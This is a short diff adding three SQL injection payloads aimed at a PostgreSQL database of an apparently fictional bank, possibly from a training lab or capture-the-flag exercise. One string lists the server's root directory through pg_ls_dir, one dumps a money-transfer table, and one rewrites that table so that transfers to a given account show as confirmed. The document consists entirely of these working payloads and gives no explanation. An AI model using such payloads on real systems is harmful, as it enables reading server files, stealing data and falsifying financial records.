@@ -1,0 +1,3 @@
+'; select * from pg_ls_dir('/'); --
+'; select * from public."BarchuckBank_transfer"; --
+'; update public."BarchuckBank_transfer" set confirmed=true where recipient_account='99999999999999999999999999'; --
